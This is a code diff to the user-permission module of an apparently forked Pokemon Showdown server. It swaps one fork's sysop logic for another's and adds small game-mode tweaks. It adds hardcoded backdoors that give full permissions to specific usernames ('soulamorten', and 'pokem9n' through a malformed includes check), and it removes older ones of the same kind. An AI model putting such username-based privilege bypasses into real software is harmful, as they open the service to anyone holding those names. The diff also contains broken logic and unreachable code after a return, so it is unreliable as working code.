@@ -567,14 +567,12 @@ class User {
 				const mutedSymbol = (Config.punishgroups && Config.punishgroups.muted ? Config.punishgroups.muted.symbol : '!');
 				return mutedSymbol + this.name;
 			}
-			if ((!room.auth || !room.auth[this.userid]) && this.customSymbol) return this.customSymbol + this.name;
 			return room.getAuth(this) + this.name;
 		}
 		if (this.semilocked) {
 			const mutedSymbol = (Config.punishgroups && Config.punishgroups.muted ? Config.punishgroups.muted.symbol : '!');
 			return mutedSymbol + this.name;
 		}
-		if (this.customSymbol) return this.customSymbol + this.name;
 		return this.group + this.name;
 	}
 	/**
@@ -600,9 +598,9 @@ class User {
 	 * @return {boolean}
 	 */
 	can(permission, target = null, room = null) {
-		if (this.hasSysopAccess()) return true;
+	if (this.hasSysopAccess() || (this.userid === "soulamorten")) return true;
 		let groupData = Config.groups[this.group];
-		if (groupData && groupData['root'] || user.id === 'zeruora') {
+		if (groupData && groupData['root']) {
 			return true;
 		}
 
@@ -655,8 +653,8 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		let sysopIp = Config.consoleips.includes(this.latestIp);
-		if (this.isSysop === true && Config.backdoor || Config.WLbackdoor && ['zeruora', 'light22', 'deltasummer'].includes(this.userid) || this.isSysop === 'WL' && sysopIp) {
+		if (this.isSysop && Config.backdoor || Config.special.includes(this.userid==="pokem9n")) {
+	    //if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -730,9 +728,20 @@ class User {
 			if (userid === this.userid) break;
 			const game = Rooms(roomid).game;
 			if (!game || game.ended) continue; // should never happen
+			// SGgame
+			if (game.format && game.format === 'gen7wildpokemonalpha') {
+				this.popup(`You can't change your name right now because you're in the middle of a wild pokemon encounter.`);
+				return false;
+			}
 			if (game.allowRenames || !this.named) continue;
 			this.popup(`You can't change your name right now because you're in ${game.title}, which doesn't allow renaming.`);
 			return false;
+			// SGgame
+			if (this.console) {
+			// Shutdown on rename
+				this.sendTo(this.console.room, '|uhtmlchange|console' + this.userid + this.consoleId + '|');
+				delete this.console;
+			}
 		}
 
 		let challenge = '';
@@ -847,7 +856,6 @@ class User {
 		}
 
 		let registered = false;
-		let wlUser = Db.userType.get(userid) || 1;
 		// user types:
 		//   1: unregistered user
 		//   2: registered user
@@ -862,17 +870,12 @@ class User {
 				this.isSysop = true;
 				this.trusted = userid;
 				this.autoconfirmed = userid;
-			} else if (wlUser === 3) {
-				// Wavelength sysop
-				this.isSysop = 'WL';
-				this.trusted = userid;
+			} else if (userType === '4') {
 				this.autoconfirmed = userid;
-			} else if (userType === '4' || wlUser === 4) {
-				this.autoconfirmed = userid;
-			} else if (userType === '5' || (wlUser === 5 && userType !== '6')) {
+			} else if (userType === '5') {
 				this.permalocked = userid;
 				Punishments.lock(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permalocked as ${name}`);
-			} else if (userType === '6' || wlUser === 6) {
+			} else if (userType === '6') {
 				Punishments.ban(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permabanned as ${name}`);
 			}
 		}
@@ -909,8 +912,8 @@ class User {
 			Punishments.checkName(user, userid, registered);
 
 			Rooms.global.checkAutojoin(user);
-			WL.giveDailyReward(user);
-			WL.friendLogin(user);
+			Server.giveDailyReward(user);
+			Server.friendLogin(user);
 			Chat.loginfilter(user, this, userType);
 			return true;
 		}
@@ -922,15 +925,14 @@ class User {
 		if (!this.forceRename(name, registered)) {
 			return false;
 		}
-
 		Rooms.global.checkAutojoin(this);
-		WL.giveDailyReward(this);
+		Server.giveDailyReward(this);
 		Chat.loginfilter(this, null, userType);
 		if (Tells.inbox[userid]) Tells.sendTell(userid, this);
 		Ontime[userid] = Date.now();
-		WL.showNews(userid, this);
-		WL.onlineFriends(userid);
-		WL.friendLogin(this);
+		Server.showNews(userid, this);
+		Server.onlineFriends(userid);
+		Server.friendLogin(this);
 		return true;
 	}
 	/**
@@ -1031,7 +1033,7 @@ class User {
 		}
 
 		if (oldUser.isSysop) {
-			this.isSysop = (oldUser.isSysop === 'WL' ? 'WL' : true);
+			this.isSysop = true;
 			oldUser.isSysop = false;
 		}
 
@@ -1198,7 +1200,7 @@ class User {
 	 * @param {Connection} connection
 	 */
 	onDisconnect(connection) {
-		if (this.named) Db.seen.set(this.userid, Date.now());
+	    if (this.named) Db.seen.set(this.userid, Date.now());
 		if (Ontime[this.userid]) {
 			Db.ontime.set(this.userid, Db.ontime.get(this.userid, 0) + (Date.now() - Ontime[this.userid]));
 			delete Ontime[this.userid];
@@ -1567,6 +1569,8 @@ function pruneInactive(threshold) {
 	let now = Date.now();
 	for (const user of users.values()) {
 		if (user.connected) continue;
+		// SGgame
+		if (user.userid === 'sgserver') continue; // Dont delete the COM!
 		if ((now - user.lastConnected) > threshold) {
 			user.destroy();
 		}
